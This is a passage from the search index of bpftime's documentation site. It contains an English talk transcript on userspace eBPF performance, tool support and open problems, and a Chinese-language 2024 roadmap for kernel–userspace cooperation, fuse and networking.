execution. And what's the takeaway? LLVM's JIT is leading the pack\u2014it's the Usain Bolt here, potentially the fastest out there.</p> <p>But, there's a catch. Sometimes LLVM can feel a bit heavy, like it's carrying extra weight on the track. That's where AOT, or Ahead-Of-Time compilation, comes in. It's like preparing for the race ahead of time, so when the starting gun goes off, you're ready to bolt.</p> <p>The charts present a clear visual representation of execution times across different runtimes for various functions like prime number calculation or memory copying. They make it evident that LLVM's JIT can significantly reduce execution times, bringing it close to native performance levels.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#introduce-to-evaluation-cases","title":"introduce to Evaluation &amp; Cases","text":"<p>Let's explore some real-world evaluations and use cases. Existing eBPF use cases can be run without or with minor fixes, and we've tested bpftime with a variety of tools and applications, including bcc, bpftrace, and ebpf_exporter.</p> <p>With bpftime, bcc tools for userspace traceing, like Bash, Memory Allocation, SSL/TLS, and tools for system call tracing, like Opensnoop, Sigsnoop, and Syscount, can be easily deployed in userspace without kernel support and without any modification to the tools themselves.</p> <p>We've also put bpftime to the test with complex observability projects like Deepflow, which is a combination of userspace tracing and kernel tracing.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#bpftrace-and-bcc","title":"bpftrace and bcc","text":"<p>let's turn our attention to how it enhances the utility of bpftrace and BCC, the tool sets of the eBPF ecosystem.</p> <p>With bpftime, we've taken bpftrace to new heights\u2014it can now run entirely in userspace. Imagine having a powerful telescope that works just as well from your backyard as it does mounted on a high-altitude observatory; that's bpftrace with bpftime. It can trace system calls or uprobes without leaning on kernel support.</p> <p>As for BCC, the toolset is vast and versatile, covering everything from applications and runtimes to the system call interface. We've successfully brought these tools, which traditionally operated at the kernel level, into the realm of userspace. </p> <p>This transition is akin to moving from studio-based recording to live streaming; the performance is live, direct, and without the constraints of a studio setting.</p> <p>We haven't just stopped at bpftrace and BCC. We've ported and tested a suite of bcc/libbpf-tools to work seamlessly with bpftime. And for those who are metrics-driven, the Prometheus ebpf_exporter is fully operational under bpftime's wing, ensuring your observability pipelines remain uninterrupted.</p> <p>The visual here [referring to the slide] provides an expansive view of the eBPF tracing tools landscape, showcasing the breadth of tooling that bpftime supports, from monitoring file systems to network activity, and even CPU performance.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#sslsniff","title":"sslsniff","text":"<p>\"Let's focus on a head-to-head comparison that really illustrates the power of userspace eBPF with bpftime: Kernel versus User SSL Sniff on Nginx.</p> <p>We're using sslsniff, a tool provided by the bcc suite to capture SSL/TLS data.</p> <p>The impact on performance is our primary concern here. The metrics on the slide reveal a stark contrast. When kernel-based SSL Sniff is at play, the overhead is significant. We're seeing a reduction in requests per second by nearly 58% and a similar figure for the transfer rate. That's a heavy toll on performance.</p> <p>Switch to userspace, and the picture changes dramatically. The overhead drops to just over 12% for both requests and transfer rates. This is like comparing a fuel-efficient car to a gas-guzzler\u2014both get you to your destination, but one does it with much less resource consumption.</p> <p>To put this into context, the benchmark uses wrk, a modern HTTP benchmarking tool, against a local Nginx server, all running on a Linux kernel version 6.2.0, with Nginx at version 1.22.0.</p> <p>What we draw from this is clear: userspace SSL Sniff, enabled by bpftime, significantly lessens the performance impact compared to its kernel counterpart, offering a more efficient solution for SSL/TLS data interception in a live server environment.\"</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#deepflow","title":"deepflow","text":"<p>Deepflow is another realworld and complex workload that using the power of eBPF. With over 5000 lines of kernel eBPF code, this project integrates uprobes, kprobes, sockets, and tracepoints to monitor and manage the intricacies of application behavior.</p> <p>Deepflow has been battle-tested in production environments and its findings have been shared with the wider community in SIGCOMM 23, showcasing its success and robustness.</p> <p>When we zoom in on Layer 7 observability, we encounter a common bottleneck: performance slowdowns due to probing. However, with bpftime's userspace uprobes, this slow down is minimized\u2014reducing request and transfer rates by just over 15%. On the other hand, kernel uprobes exhibit a heavier impact, with reductions close to 22%.</p> <p>The bar charts visually break down these performance impacts. They show us, in no uncertain terms, the advantage of userspace uprobes enabled by bpftime compared to their kernel counterparts, with a clear lesser impact on request and transfer rates.</p> <p>This is a testament to the efficiency of userspace eBPF implementations. By keeping more of the observation workload in userspace, Deepflow demonstrates that it's possible to maintain a high level of observability with minimal performance sacrifice.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#roadmap-1-and-future-enhancements","title":"Roadmap 1 and Future Enhancements","text":"<p>Here is the roadmap for bpftime's development.</p> <p>First on the is the network domain. We're examining how userspace eBPF can interplay with DPDK, which is a set of libraries for fast packet processing. The goal? To establish a programmable network stack that enhances the performance without the need for a traditional control plane.</p> <p>We're also exploring how userspace eBPF can accelerate file systems, particularly fuse \u2014 a mechanism widely used for Android and cloud storage. Imagine streamlining the filter process, making it more efficient and less resource-intensive. That's what we're targeting.</p> <p>And then there's the hotpatching of userspace functions. This is a game-changer for live systems, enabling real-time updates and bug fixes without pausing or rebooting applications.</p> <p>So, what's next?</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#roadmap-2","title":"Roadmap 2","text":"<p>There are also more improvements on the horizon for bpftime.</p> <p>Firstly, we're committed to grounding our progress in data, which is why more benchmarks and evaluations are on the docket. This will help us understand and showcase the true capabilities and enhancements of bpftime in various scenarios.</p> <p>A key focus is to enhance the synergy between bpftime and kernel eBPF. By improving compatibility through expanded support for maps and helpers, we will bridge the gap between userspace and kernel, ensuring a more seamless experience.</p> <p>Performance is at the heart of our endeavor. We aim to optimize the LLVM JIT and runtime, ensuring that bpftime is not just powerful, but also efficient. And for environments where resources are at a premium, LLVM AOT compilation for eBPF will be a game-changer, offering the benefits of eBPF even in the most constrained environments.</p> <p>Security is non-negotiable, and we will be vigilant to ensure that the eBPF is robust against potential attacks.</p> <p>Lastly, our commitment to quality is unwavering. More tests, continuous integration, and cleaner code are the pillars that will support the reliable growth of bpftime.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#open-problems-and-discussion","title":"Open Problems and Discussion","text":"<p>As we navigate the intricate path of eBPF development, particularly in bridging the gap between kernel and userspace, we also encounter a set of open problems that remains.</p> <p>One of the key challenges is the BPF_F_MMAP flag's limitation to arrays. The quest is to devise a high-performance hash map that can be shared efficiently between the kernel and userspace. Could introducing new hash map types be the answer? Or perhaps we should consider overlaying a basic hash map atop the existing array map structure?</p> <p>Furthermore, there\u2019s the question of facilitating kernel eBPF programs' access to userspace maps. This opens the door to potential cache mechanisms and synchronization with syscalls, merging the speed of kernel operations with the flexibility of userspace.</p> <p>Error propagation presents another conundrum: How can we design kernel eBPF processes to wait for userspace operations effectively and handle errors gracefully?</p> <p>We're also pondering the implications of an unprivileged eBPF type that could democratize eBPF usage, reducing the entry barriers for developers and ensuring a broader adoption.</p> <p>And finally, the security models around eBPF remain a priority. We must continue to innovate to protect against vulnerabilities and ensure that eBPF remains a robust tool for system introspection.</p>"},{"location":"others/miscellaneous/linux-plumbers-talk/#closing-slide-conclusion-and-qa","title":"Closing Slide: Conclusion and Q&amp;A","text":"<p>In conclusion, we've seen how the userspace uprobes offer a tenfold speed increase over kernel uprobes, which is a significant advancement in our performance optimization efforts, and The ability to use shared memory (shm) maps and dynamically inject code into running processes without stopping.</p> <p>Our tooling can be compatible with existing eBPF toolchains, libraries, and applications, ensuring a seamless integration into your current workflows.</p> <p>By working together with kernel eBPF, we're not just improving performance but also expanding the scope and capabilities of what we can monitor and how we can intervene.</p> <p>Thank you for your attention, and I'm looking forward to our discussion.</p> <p>Share on  Share on </p>"},{"location":"others/miscellaneous/roadmap/","title":"bpftime roadmap and ideas for 2024","text":"<p>\u4e00\u4e9b\u63a5\u4e0b\u6765 bpftime \u53ef\u4ee5\u505a\u7684\u65b9\u5411\u6574\u7406\uff1a</p>"},{"location":"others/miscellaneous/roadmap/#1-userspace-ebpf-ebpf-kernel-ebpf","title":"1. \u8ba9 Userspace eBPF \u548c\u5185\u6838\u7684 eBPF \u534f\u540c\u5de5\u4f5c\uff0c\u5b8c\u6210\u590d\u6742\u4efb\u52a1\uff0c\u5e76\u4e14\u548c Kernel \u7684 eBPF \u673a\u5236\u5b8c\u5168\u517c\u5bb9","text":"<p>\u5b8c\u5584\u529f\u80fd\u4ee5\u65e0\u7f1d\u652f\u6301\u5927\u578b eBPF \u5e94\u7528\u7a0b\u5e8f\u3002\u5f53\u524d\u7684\u5927\u578b eBPF \u7a0b\u5e8f\u90fd\u9700\u8981\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u534f\u540c\u5de5\u4f5c\uff0c\u628a\u5185\u6838\u6001\u548c\u7528\u6237\u6001\u7684\u4fe1\u606f\u901a\u8fc7 maps \u548c\u8bfb\u53d6\u76f8\u4e92\u5173\u8054\u8d77\u6765\uff0c\u8fd9\u4e5f\u662f\u548c\u4f20\u7edf\u7684 DBI \u6846\u67b6\u7684\u4e0d\u540c\u4e4b\u5904\u3002</p> <p>\u6211\u4eec\u5c06\u63d0\u4f9b\u4e24\u79cd\u6a21\u5f0f\uff1a</p> <ol> <li>\u4ec5\u5728\u7528\u6237\u7a7a\u95f4\u8fd0\u884c eBPF\uff08\u6a21\u5f0f 1\uff09</li> <li>\u53ef\u5728\u975e Linux \u7cfb\u7edf\u4e0a\u65e0\u9700\u5185\u6838\u5730\u8fd0\u884c</li> <li> <p>\u5bf9\u4e8e\u5927\u578b eBPF \u5e94\u7528\u5e76\u4e0d\u975e\u5e38\u9002\u7528\uff0c\u56e0\u4e3a\u5728\u5171\u4eab\u5185\u5b58\u4e2d\u7684\u6620\u5c04\u65e0\u6cd5\u88ab\u5185\u6838\u7684 eBPF \u7a0b\u5e8f\u6240\u4f7f\u7528</p> </li> <li> <p>\u5728\u7528\u6237\u7a7a\u95f4\u4e0e\u5185\u6838\u7a7a\u95f4\u540c\u65f6\u8fd0\u884c eBPF\uff0c\u5e76\u914d\u5907 bpftime-daemon</p> </li> <li>\u66f4\u597d\u5730\u4e0e\u5185\u6838 eBPF \u517c\u5bb9\uff0c\u652f\u6301\u5305\u542b\u6570\u5343\u884c eBPF \u4ee3\u7801\u7684\u5927\u578b eBPF \u5e94\u7528\uff0c\u540c\u65f6\u652f\u6301 uprobe\u3001kprobe\u3001socket \u7b49\u6df7\u5408\u4f7f\u7528</li> <li>\u8ba9\u5185\u6838\u6001\u7684 eBPF \u4e0e\u7528\u6237\u6001\u7684 eBPF \u534f\u540c\u5de5\u4f5c</li> <li>\u65e0\u9700\u4fee\u6539\u5185\u6838\uff0c\u4f46\u4f1a\u6539\u53d8 BPF \u7cfb\u7edf\u8c03\u7528\u7684\u884c\u4e3a</li> <li>\u8fd9\u4e00\u601d\u8def\u4e0e fuse \u6709\u76f8\u4f3c\u4e4b\u5904\uff0c\u9700\u8981\u4e00\u4e2a\u5185\u6838\u4e2d\u7684 eBPF \u7a0b\u5e8f\u548c\u7528\u6237\u6001\u7684 bpftime-daemon \u534f\u540c\u5de5\u4f5c\u3002</li> </ol>"},{"location":"others/miscellaneous/roadmap/#2-userspace-ebpf-kernel-ebpf","title":"2. \u63a2\u7d22 Userspace eBPF \u548c Kernel eBPF \u76f8\u7ed3\u5408\u7684\u65b0\u7684\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u4ea4\u4e92\u7684\u65b9\u5f0f\u3001\u7f16\u7a0b\u6a21\u578b","text":"<p>\u968f\u7740\u8ba1\u7b97\u9886\u57df\u7684\u4e0d\u65ad\u8fdb\u6b65\uff0c\u6211\u4eec\u6240\u9762\u4e34\u7684\u6280\u672f\u95ee\u9898\u4e5f\u53d8\u5f97\u8d8a\u6765\u8d8a\u590d\u6742\u3002\u5176\u4e2d\uff0c\u5982\u4f55\u51cf\u5c11\u5185\u6838\u4e0e\u7528\u6237\u7a7a\u95f4\u7684\u4ea4\u4e92\u5f00\u9500\uff0c\u5e76\u63d0\u4f9b\u66f4\u9ad8\u6548\u3001\u66f4\u7075\u6d3b\u7684\u7f16\u7a0b\u6a21\u578b\uff0c\u6210\u4e3a\u4e86\u7814\u7a76\u7684\u70ed\u70b9\u3002\u672c\u6587\u5c06\u6df1\u5165\u63a2\u8ba8 eBPF\uff08Extended Berkeley Packet Filter\uff09\u5982\u4f55\u4e3a\u8fd9\u4e00\u95ee\u9898\u5e26\u6765\u4e86\u65b0\u7684\u89e3\u51b3\u65b9\u6848\u3002</p>"},{"location":"others/miscellaneous/roadmap/#_1","title":"\u73b0\u6709\u7684\u5185\u6838\u4e0e\u7528\u6237\u7a7a\u95f4\u4ea4\u4e92\u7b56\u7565","text":"<p>\u9996\u5148\uff0c\u6211\u4eec\u9700\u8981\u8ba4\u8bc6\u5230\uff0c\u4e0a\u4e0b\u6587\u5207\u6362\u2014\u2014\u5c24\u5176\u662f\u5728\u540c\u6b65\u7684\u7cfb\u7edf\u8c03\u7528\u4e2d\u2014\u2014\u786e\u5b9e\u4f1a\u5e26\u6765\u76f8\u5f53\u5927\u7684\u6027\u80fd\u5f00\u9500\u3002\u4e3a\u4e86\u4f18\u5316\u8fd9\u79cd\u4ea4\u4e92\uff0c\u5f00\u53d1\u8005\u548c\u7814\u7a76\u8005\u4eec\u63d0\u51fa\u4e86\u4ee5\u4e0b\u51e0\u79cd\u7b56\u7565\uff1a</p> <ul> <li>iouring\uff1a\u8fd9\u662f\u4e00\u4e2a\u65b0\u7684\u8f7b\u91cf\u7ea7\u7684\u5f02\u6b65I/O\u63a5\u53e3\uff0c\u65e8\u5728\u51cf\u5c11\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u4ece\u800c\u63d0\u9ad8I/O\u64cd\u4f5c\u7684\u6548\u7387\u3002iouring \u901a\u8fc7 ring buffer \u5b9e\u73b0\u4e86\u7528\u6237\u7a7a\u95f4\u548c\u5185\u6838\u7a7a\u95f4\u7684\u53cc\u5411\u6570\u636e\u4f20\u8f93\uff0c\u4ece\u800c\u907f\u514d\u4e86\u4f20\u7edf\u7684\u7cfb\u7edf\u8c03\u7528\u5f00\u9500\u3002</li> <li>\u7cfb\u7edf\u8c03\u7528\u6279\u5904\u7406\uff1a\u8fd9\u79cd\u7b56\u7565\u4f1a\u5c06\u591a\u4e2a\u7cfb\u7edf\u8c03\u7528\u5408\u5e76\u4e3a\u4e00\u4e2a\u6279\u6b21\u6267\u884c\uff0c\u4ece\u800c\u51cf\u5c11\u4e0a\u4e0b\u6587\u5207\u6362\u7684\u6b21\u6570\u3002</li> <li>\u5f02\u6b65\u7cfb\u7edf\u8c03\u7528\uff1a\u4e0e\u4f20\u7edf\u7684\u540c\u6b65\u7cfb\u7edf\u8c03\u7528\u4e0d\u540c\uff0c\u5f02\u6b65\u8c03\u7528\u4e0d\u9700\u8981\u7b49\u5f85\u5176\u5b8c\u6210\uff0c\u4ece\u800c\u53ef\u4ee5\u7ee7\u7eed\u6267\u884c\u5176\u4ed6\u4efb\u52a1\u3002\u4e00\u822c\u6765\u8bf4\u5b83\u7684\u539f\u7406\u662f\uff1a\u7528\u6237\u7a7a\u95f4\u53d1\u8d77\u4e00\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u5185\u6838\u7acb\u5373\u8fd4\u56de\uff0c\u7136\u540e\u5728\u540e\u53f0\u6267\u884c\u8fd9\u4e2a\u7cfb\u7edf\u8c03\u7528\uff0c\u6700\u540e\u901a\u77e5\u7528\u6237\u7a7a\u95f4\u7cfb\u7edf\u8c03\u7528\u5df2\u7ecf\u5b8c\u6210\u3002</li> </ul> <p>\u8fd9\u4e9b\u65b9\u6cd5\u867d\u7136\u53d6\u5f97\u4e86\u4e00\u5b9a\u7684\u6210\u529f\uff0c\u4f46\u5728\u9762\u5bf9\u73b0\u4ee3\u8ba1\u7b97\u7684\u590d\u6742\u73af\u5883\u65f6\uff0c\u4ecd\u5b58\u5728\u4e00\u4e9b\u5c40\u9650\u6027\u3002</p>"},{"location":"others/miscellaneous/roadmap/#ebpf","title":"eBPF\uff1a\u65b0\u7684\u4ea4\u4e92\u65b9\u5f0f","text":"<p>eBPF\uff0c\u4e00\u79cd\u5728\u5185\u6838\u4e2d\u8fd0\u884c\u7684\u7a0b\u5e8f\uff0c\u63d0\u4f9b\u4e86\u4e00\u79cd\u5168\u65b0\u7684\u673a\u5236\u6765\u5904\u7406\u548c\u4f18\u5316\u7528\u6237\u7a7a\u95f4\u548c\u5185\u6838\u4e4b\u95f4\u7684\u4ea4\u4e92\u3002\u4ee5\u4e0b\u662f eBPF \u6240\u5e26\u6765\u7684\u51e0\u4e2a\u5173\u952e\u7279\u6027\uff1a</p> <ul> <li>eBPF maps\uff1aeBPF maps \u662f\u4e00\u79cd\u7279\u6b8a\u7684\u6570\u636e\u7ed3\u6784\uff0c\u5b83\u4eec\u53ef\u4ee5\u5728\u7528\u6237\u7a7a\u95f4\u548c\u5185\u6838\u4e4b\u95f4\u65e0\u7f1d\u5730\u5de5\u4f5c\uff0c\u6781\u5927\u5730\u51cf\u5c11\u4e86\u6570\u636e\u4ea4\u6362\u7684\u7cfb\u7edf\u8c03\u7528\u5f00\u9500\u3002</li> <li>BPF_F_MMAP\uff1a\u8fd9\u4e2a\u7279\u6027\u5141\u8bb8\u5f00\u53d1\u8005\u5c06 eBPF maps \u6620\u5c04\u5230\u7528\u6237\u7a7a\u95f4\u548c\u5185\u6838\u4e4b\u95f4\u7684\u5171\u4eab\u5185\u5b58\uff0c\u4ece\u800c\u5b9e\u73b0\u9ad8\u6548\u7684\u6570\u636e\u8bbf\u95ee\u3002</li> <li>eBPF Ring Buffer &amp; eBPF User Ring Buffer\uff1a\u4e0e iouring \u7c7b\u4f3c\uff0c\u8fd9\u4e24\u79cd eBPF map \u63d0\u4f9b\u4e86\u4e00\u79cd\u9ad8\u6548\u7684\u53cc\u5411\u6570\u636e\u4f20\u8f93\u673a\u5236\uff0c\u8fdb\u4e00\u6b65\u51cf\u5c11\u4e86\u7cfb\u7edf\u8c03\u7528\u7684\u9700\u8981\u3002</li> <li>\u52a8\u6001\u4ee3\u7801\u4fee\u6539\uff1aeBPF \u7684\u53e6\u4e00\u4e2a\u663e\u8457\u7279\u70b9\u662f\u5b83\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u4fee\u6539\u548c\u4f18\u5316\u5185\u6838\u6216\u7528\u6237\u7a7a\u95f4\u7684\u4ee3\u7801\u3002\u8fd9\u4e3a\u5f00\u53d1\u8005\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5f3a\u5927\u7684\u5de5\u5177\uff0c\u4f7f\u4ed6\u4eec\u80fd\u591f\u5728\u4e0d\u4fee\u6539\u6e90\u4ee3\u7801\u6216\u91cd\u65b0\u542f\u52a8\u7cfb\u7edf\u7684\u60c5\u51b5\u4e0b\u8fdb\u884c\u5fae\u8c03\u3002</li> <li>\u534f\u540c\u6267\u884c\uff1aeBPF \u5141\u8bb8\u90e8\u5206\u529f\u80fd\u5728\u7528\u6237\u7a7a\u95f4\u6267\u884c\uff0c\u90e8\u5206\u5728\u5185\u6838\u7a7a\u95f4\u6267\u884c\uff0c\u4e24\u8005\u53ef\u4ee5\u534f\u540c\u5de5\u4f5c\uff0c\u5e76\u5f02\u6b65\u8c03\u7528\u3002</li> <li>By pass kernel\uff1aeBPF \u548c\u7528\u6237\u7a7a\u95f4\u534f\u540c\u5de5\u4f5c\uff0c\u53ef\u4ee5\u8df3\u8fc7\u4e00\u90e8\u5206\u5185\u6838\u4e2d\u4f20\u7edf\u7684\u8f83\u957f\u7684\u5904\u7406\u8def\u5f84\uff0c\u4ece\u800c\u63d0\u9ad8\u6027\u80fd\u3002\u4f8b\u5982\uff0cXDP \u5b9e\u73b0\u4e86\u4e00\u4e2a\u9ad8\u6548\u7684\u7f51\u7edc\u6570\u636e\u5305\u5904\u7406\u8def\u5f84\uff0c\u5b83\u53ef\u4ee5\u5728\u5185\u6838\u4e2d\u8df3\u8fc7\u4f20\u7edf\u7684\u7f51\u7edc\u534f\u8bae\u6808\uff0c\u76f4\u63a5\u5c06\u6570\u636e\u5305\u4f20\u9012\u7ed9\u7528\u6237\u7a7a\u95f4\u7684\u7a0b\u5e8f\u8fdb\u884c\u5904\u7406\u3002</li> </ul> <p>eBPF\uff0c\u4f5c\u4e3a\u4e00\u4e2a\u76f8\u5bf9\u8f83\u65b0\u7684\u6280\u672f\uff0c\u5df2\u7ecf\u5c55\u73b0\u51fa\u5176\u5f3a\u5927\u7684\u6f5c\u529b\uff0c\u4e3a\u5185\u6838\u4e0e\u7528\u6237\u7a7a\u95f4\u7684\u4ea4\u4e92\u5e26\u6765\u4e86\u65b0\u7684\u89c6\u89d2\u548c\u5de5\u5177\u3002\u800c\u5b83\u7684\u771f\u6b63\u4ef7\u503c\u53ef\u80fd\u8fd8\u5728\u7ee7\u7eed\u53d1\u6398\u4e4b\u4e2d\u3002\u4e0d\u8fc7\uff0c\u6b63\u5982\u4efb\u4f55\u6280\u672f\u5de5\u5177\uff0c\u5b83\u4e0d\u662f\u94f6\u5f39\uff0c\u6700\u7ec8\u5982\u4f55\u4f7f\u7528\u4ecd\u53d6\u51b3\u4e8e\u5177\u4f53\u7684\u5e94\u7528\u573a\u666f\u548c\u9700\u6c42\u3002\u4e0d\u8fc7\uff0c\u6beb\u65e0\u7591\u95ee\uff0ceBPF\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u4e2a\u63a2\u7d22\u66f4\u9ad8\u6548\u3001\u66f4\u7075\u6d3b\u5185\u6838\u4e0e\u7528\u6237\u6001\u4ea4\u4e92\u65b9\u5f0f\u7684\u5b9d\u8d35\u673a\u4f1a\u3002</p>"},{"location":"others/miscellaneous/roadmap/#3-bpftime-fuse","title":"3. bpftime + fuse: \u63a2\u7d22\u7528\u6237\u6001\u6587\u4ef6\u7cfb\u7edf\u548c\u5185\u6838\u6001\u76f8\u7ed3\u5408\u5e76\u534f\u540c\u52a0\u901f\u7684\u53ef\u80fd\u6027","text":"<p>\u5728\u73b0\u4ee3\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c<code>fuse</code>\uff08\u7528\u6237\u7a7a\u95f4\u6587\u4ef6\u7cfb\u7edf\uff09\u5df2\u7ecf\u6210\u4e3a\u4e86\u4e00\u4e2a\u53d7\u6b22\u8fce\u7684\u9009\u62e9\uff0c\u5141\u8bb8\u5f00\u53d1\u8005\u5728\u7528\u6237\u7a7a\u95f4\u521b\u5efa\u6587\u4ef6\u7cfb\u7edf\uff0c\u800c\u65e0\u9700\u5bf9\u5185\u6838\u4ee3\u7801\u8fdb\u884c\u4fee\u6539\u3002\u4f46\u662f\uff0c\u7cfb\u7edf\u8c03\u7528\u7684\u6210\u672c\u4ecd\u7136\u5b58\u5728\u3002\u8fd9\u662f<code>bpftime</code>\u80fd\u591f\u53d1\u6325\u4f5c\u7528\u7684\u5730\u65b9\u3002</p> <p>\u6838\u5fc3\u4f18\u52bf\u4e0e\u53ef\u80fd\u6027:</p> <ol> <li>\u7528\u6237\u6001\u548c\u5185\u6838\u6001\u534f\u540c\u4f18\u5316: \u901a\u8fc7<code>bpftime</code>\uff0c\u53ef\u4ee5\u5728\u7528\u6237\u7a7a\u95f4\u9884\u5148\u5904\u7406\u67d0\u4e9b\u6587\u4ef6\u7cfb\u7edf\u64cd\u4f5c\uff0c\u5982\u7f13\u5b58\u3001\u5143\u6570\u636e\u67e5\u8be2\u7b49\uff0c\u5e76\u4ec5\u5728\u771f\u6b63\u9700\u8981\u7684\u65f6\u5019\u4e0e\u5185\u6838\u7a7a\u95f4\u7684eBPF\u4ea4\u4e92\u3002\u8fd9\u6837\uff0c\u53ef\u4ee5\u6781\u5927\u5730\u51cf\u5c11\u4e0d\u5fc5\u8981\u7684\u7cfb\u7edf\u8c03\u7528\uff0c\u63d0\u9ad8\u6587\u4ef6\u64cd\u4f5c\u7684\u901f\u5ea6\uff0c\u52a0\u901f\u4e00\u4e9b\u53ef\u80fd\u7684\u5feb\u901f\u8def\u5f84\uff0c\u7c7b\u4f3c XRP \u7684\u673a\u5236\u4e00\u6837\u3002</li> <li>\u7528\u6237\u6001 bypass \u7684 Fuse \u673a\u5236: \u6211\u4eec\u53ef\u4ee5\u505a\u7684\u5b8c\u5168 kernel bypass \u7684 fuse\uff0c\u4f7f\u7528 eBPF \u5c06\u5bf9\u5e94\u7684\u7528\u6237\u6001\u7a0b\u5e8f\u548c vfs \u3001libfuse \u5bf9\u63a5\u8d77\u6765\uff0c\u5b9e\u73b0\u5b8c\u5168\u7684 kernel bypass \u7528\u6237\u6001\u6587\u4ef6\u7cfb\u7edf\uff0c\u5e76\u4e14\u53ef\u4ee5\u7c7b\u4f3c fuse \u90a3\u6837\uff0c\u4e0d\u9700\u8981\u5bf9\u7528\u6237\u6001\u5e94\u7528\u8fdb\u884c\u4fb5\u5165\u5f0f\u6539\u53d8\u6216\u94fe\u63a5\u3002</li> <li>\u52a8\u6001\u8c03\u6574\u7b56\u7565: \u7528\u6237\u6001\u7684<code>bpftime</code>\u53ef\u4ee5\u52a8\u6001\u5730\u6536\u96c6\u6027\u80fd\u6570\u636e\uff0c\u5e76\u636e\u6b64\u8c03\u6574\u7b56\u7565\uff0c\u4f8b\u5982\u9009\u62e9\u6700\u4f73\u7684\u7f13\u5b58\u7b56\u7565\uff0c\u800c\u8fd9\u4e9b\u90fd\u53ef\u4ee5\u5728\u8fd0\u884c\u65f6\u8fdb\u884c\uff0c\u65e0\u9700\u505c\u673a\u6216\u91cd\u542f\u3002</li> <li>\u66f4\u5f3a\u7684\u81ea\u5b9a\u4e49\u80fd\u529b: \u5f00\u53d1\u8005\u53ef\u4ee5\u6839\u636e\u5177\u4f53\u7684\u5e94\u7528\u573a\u666f\uff0c\u5b9a\u5236\u7279\u5b9a\u7684eBPF\u7a0b\u5e8f\uff0c\u4ee5\u9002\u5e94\u4e0d\u540c\u7684\u5de5\u4f5c\u8d1f\u8f7d\u548c\u4f18\u5316\u76ee\u6807\u3002</li> </ol>"},{"location":"others/miscellaneous/roadmap/#4-bpftime-network-cilium","title":"4. bpftime + network = cilium: \u4e3a\u7f51\u7edc\u901a\u4fe1\u5e26\u6765\u534f\u540c\u667a\u80fd","text":"<p>\u7f51\u7edc\u662f\u73b0\u4ee3\u8ba1\u7b97\u73af\u5883\u4e2d\u7684\u57fa\u7840\uff0c\u4f46\u968f\u7740\u8d8a\u6765\u8d8a\u590d\u6742\u7684\u901a\u4fe1\u6a21\u5f0f\u548c\u9ad8\u6d41\u91cf\u7684\u9700\u6c42\uff0c\u4f20\u7edf\u7684\u7f51\u7edc\u5904\u7406\u65b9\u5f0f\u53ef\u80fd\u65e0\u6cd5\u6ee1\u8db3\u73b0\u4ee3\u5e94\u7528\u7684\u9700\u6c42\u3002\u5728\u6b64\u80cc\u666f\u4e0b\uff0c<code>bpftime</code>\u4e0e\u7f51\u7edc\u5e93\u7684\u7ed3\u5408\u4e3a\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u79cd\u65b0\u7684\u65b9\u6cd5\u6765\u5904\u7406\u7f51\u7edc\u8bf7\u6c42\u3002</p> <p>\u6838\u5fc3\u4f18\u52bf\u4e0e\u53ef\u80fd\u6027:</p> <ol> <li>\u667a\u80fd\u7f51\u7edc\u6d41\u5904\u7406: <code>bpftime</code>\u5141\u8bb8\u5f00\u53d1\u8005\u5728\u7528\u6237\u7a7a\u95f4\u9884\u5904\u7406\u7f51\u7edc\u8bf7\u6c42\uff0c\u4f8b\u5982\uff1a\u6d41\u91cf\u5e73\u8861\u3001QoS\u7b56\u7565\u7b49\uff0c\u5e76\u4e0e\u5185\u6838\u7a7a\u95f4\u7684eBPF\u8fdb\u884c\u534f\u540c\uff0c\u53ea\u6709\u5728\u771f\u6b63\u9700\u8981\u7684\u65f6\u5019\u8fdb\u884c\u7cfb\u7edf\u8c03\u7528\u3002\u8fd9\u6837\uff0c\u53ef\u4ee5\u6709\u6548\u51cf\u5c11\u4e0a\u4e0b\u6587\u5207\u6362\uff0c\u63d0\u9ad8\u7f51\u7edc\u6548\u7387\u3002</li> <li>\u52a8\u6001\u7f51\u7edc\u7b56\u7565\u8c03\u6574: \u4e0e\u6587\u4ef6\u7cfb\u7edf\u534f\u540c\u5de5\u4f5c\u76f8\u4f3c\uff0c<code>bpftime</code>\u53ef\u4ee5\u52a8\u6001\u5730\u6536\u96c6\u7f51\u7edc\u6027\u80fd\u6570\u636e\uff0c\u5e76\u6839\u636e\u8fd9\u4e9b\u6570\u636e\u8c03\u6574\u7f51\u7edc\u5904\u7406\u7b56\u7565\uff0c\u4f8b\u5982\uff1a\u52a8\u6001\u8c03\u6574\u6d41\u91cf\u5206\u914d\u3001\u5feb\u901f\u5207\u6362\u901a\u4fe1\u8def\u5f84\u7b49\u3002</li> <li>\u66f4\u9ad8\u7684\u7f51\u7edc\u541e\u5410\u91cf: \u901a\u8fc7\u5728\u7528\u6237\u7a7a\u95f4\u9884\u5904\u7406\u7f51\u7edc\u8bf7\u6c42\uff0c\u53ef\u4ee5\u907f\u514d\u4f20\u7edf\u7f51\u7edc\u5806\u6808\u7684\u5f00\u9500\uff0c\u4ece\u800c\u5b9e\u73b0\u66f4\u9ad8\u7684\u7f51\u7edc\u541e\u5410\u91cf\uff0c\u7279\u522b\u662f\u5728\u9ad8\u6d41\u91cf\u548c\u4f4e\u5ef6\u8fdf\u7684\u573a\u666f\u4e2d\u3002\u53ef\u4ee5\u5c06\u7528\u6237\u6001 eBPF \u548c\u7528\u6237\u6001\u7684\u7f51\u7edc\u5e93\u7ed3\u5408\u8d77\u6765\uff0c\u5728\u7c7b\u4f3c cilium \u7684\u573a\u666f\u4e2d\u52a0\u901f service mesh \u7684\u7f51\u7edc\u8bf7\u6c42\u8f6c\u53d1\u548c\u5904\u7406\u3002</li> </ol> 